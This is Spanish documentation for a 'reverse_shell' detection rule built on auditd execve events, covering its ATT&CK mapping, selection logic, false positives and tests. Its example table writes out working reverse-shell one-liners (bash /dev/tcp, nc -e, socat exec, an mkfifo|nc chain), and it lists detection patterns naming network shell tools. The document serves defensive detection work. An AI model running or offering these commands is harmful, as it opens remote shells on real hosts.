# Reverse shell con bash, netcat, socat o intérpretes

| | |
|---|---|
| ID | `b0ddbaa6-a2b7-468c-8959-84f96267bb99` |
| Nombre | `reverse_shell` |
| Nivel | crítico |
| Tácticas | Ejecución, Comando y control |
| Técnicas | [T1059.004](https://attack.mitre.org/techniques/T1059/004/) Unix Shell · [T1095](https://attack.mitre.org/techniques/T1095/) Non-Application Layer Protocol |
| Fuente | auditd (`-S execve`) |

## Qué detecta

Las cinco familias de reverse shell que aparecen en cualquier cheatsheet:

| Familia | Ejemplo |
|---|---|
| bash `/dev/tcp` | `bash -i >& /dev/tcp/203.0.113.9/4444 0>&1` |
| netcat con ejecución | `nc -e /bin/sh host 4444`, `ncat --exec /bin/bash host 4444` |
| socat | `socat tcp:host:4444 exec:bash -li,pty,stderr,setsid` |
| mkfifo encadenado | `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc host 4444 >/tmp/f` |
| intérpretes | python/perl/ruby/php que abren un socket, hacen `connect` y duplican descriptores (`dup2`, `pty.spawn`) |

## Técnica ATT&CK

T1059.004 porque la shell es el intérprete que ejecuta la carga; T1095 porque el canal es TCP crudo sin protocolo de aplicación, que es lo que distingue una reverse shell de una conexión HTTP.

## Lógica

Todas las selecciones trabajan sobre `data.audit.execve.cmdline`, que el motor arma a partir de los argumentos `aN` decodificando el hexadecimal con que auditd registra cualquier argumento con espacios. Sin esa decodificación el payload de `bash -c "..."` sería invisible (ver `docs/formato-eventos.md`).

- `selection_dev_tcp`: contiene `/dev/tcp/` o `/dev/udp/`.
- `selection_netcat`: el binario es netcat y la línea tiene una opción corta que termina en `e` o `c` (`-e`, `-e/bin/sh`, `-lvpe`, `-c`), `--exec` o `--sh-exec`.
- `selection_socat`: binario socat y `exec:` o `system:`.
- `selection_mkfifo`: regex `mkfifo.*\|\s*(nc|ncat|netcat|socat|openssl)\b`.
- `selection_python_perl`: `socket` y `connect` juntos, más alguna señal de shell (`dup2`, `pty.spawn`, `/bin/sh`, `/bin/bash`).
- `selection_php`: `fsockopen` más `exec(`, `system(`, `popen(`, `proc_open(`, `shell_exec(` o una ruta de shell.
- `selection_ruby`: `TCPSocket` más `exec`, `spawn`, `system`, `popen` o una ruta de shell.

## Falsos positivos conocidos

- Scripts de monitoreo que abren `/dev/tcp` para comprobar un puerto. Es raro y no usan `-i`; si aparece, acotar `selection_dev_tcp` a `bash -i` o `>&`.
- Pruebas de red con netcat en modo cliente sin `-e` no disparan.

## Cómo probarla

```bash
detectionlab run samples/reverse_shell/positivos.jsonl --json
pytest -k reverse_shell
```

Los positivos incluyen el payload de bash con `a2` en hexadecimal, tal como lo escribe auditd, `nc -e/bin/sh` sin espacio, y las variantes en php y ruby. Los negativos: `nc -zv`, `socat - TCP:`, python con `socket` sin `connect`, `mkfifo` solo, `nc -l`, un `fsockopen` de comprobación de salud y un `TCPSocket` que solo imprime la dirección remota.
